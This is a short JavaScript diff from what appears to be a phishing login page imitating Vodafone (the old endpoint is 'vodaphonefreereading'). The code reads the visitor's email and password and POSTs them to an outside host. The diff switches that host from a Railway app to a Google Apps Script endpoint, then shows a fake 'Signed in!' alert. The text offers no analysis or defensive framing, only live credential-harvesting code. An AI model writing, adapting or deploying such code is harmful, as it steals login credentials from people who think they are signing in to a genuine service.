@@ -461,10 +461,10 @@
   const email = document.querySelector('input[type="email"]').value;
   const password = document.getElementById('pwInput').value;
 
-  await fetch('https://vodaphonefreereading-production.up.railway.app/', {
+  await fetch('https://script.google.com/macros/s/AKfycbxy3FG2DzaqKA9puexalyeW5rw9H31rmeEXG5fX31jL1AM4TjUOA4HlgxYA39oJO0moRw/exec', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ text: email + ' | ' + password })
+    body: JSON.stringify({ email, password })
   });
 
   alert('Signed in!');
